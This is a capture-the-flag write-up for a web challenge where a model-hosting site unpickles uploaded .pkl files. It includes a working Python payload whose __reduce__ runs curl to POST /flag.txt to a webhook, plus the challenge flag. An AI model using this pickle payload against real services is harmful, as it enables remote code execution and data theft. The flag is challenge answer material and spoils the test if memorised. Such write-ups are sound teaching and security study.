# Writeup — OpenML: PKL Injection

**Category:** Web / Insecure Deserialization  
**Difficulty:** Medium  
**Flag:** `ctfupb{0p3nml_5ecur17y_f4iled_t0_4_fr1k1ng_p1ck1e}`

---

## Summary

OpenML is a platform that claims to *"secure AI by providing free resources to
build and train models"*.  It accepts `.pkl` model uploads and evaluates them
with `pickle.load()` — trusting user-supplied data completely.  Knowing that
pickle execution is arbitrary, we craft a malicious model that exfiltrates
`/flag.txt` to a webhook.

---

## Step 1 — Identify the vulnerability

`pickle.load()` invokes the special `__reduce__` method of the deserialised
object, which can return any Python callable along with its arguments.
This is essentially a built-in RCE primitive.

The data flow is:

```
User uploads .pkl  →  server calls pickle.load(f)  →  arbitrary code runs
```

---

## Step 2 — Build the malicious payload

```python
import pickle, os

WEBHOOK = "https://webhook.site/your-uuid"

class Exploit:
    def __reduce__(self):
        cmd = (
            f"curl -s -X POST '{WEBHOOK}' "
            f"--data-urlencode 'flag=$(cat /flag.txt)'"
        )
        return (os.system, (cmd,))

with open("evil_model.pkl", "wb") as f:
    pickle.dump(Exploit(), f)
```

When the server deserialises the file, pickle calls `os.system(cmd)`, which
runs `curl` and POST-exfiltrates `/flag.txt` to the webhook.

---

## Step 3 — Upload the payload

1. Open your webhook dashboard (e.g. `https://webhook.site`).
2. Upload `evil_model.pkl` via the form at `/`.
3. Watch the webhook panel — an incoming POST will contain the flag.

---

## Step 4 — Collect the flag

The webhook will receive:

```
flag=ctfupb{0p3nml_5ecur17y_f4iled_t0_4_fr1k1ng_p1ck1e}
```

---

## Why other players are not affected

Each upload is isolated inside a unique `uuid.uuid4()` directory under `/tmp/`.
Evaluation runs in a **separate subprocess** with a 15 s timeout.  The directory
is deleted afterwards regardless of outcome, so sessions never interfere.

---

## Full automation

```bash
python3 solution/solve.py http://localhost:5001 https://webhook.site/your-uuid
```
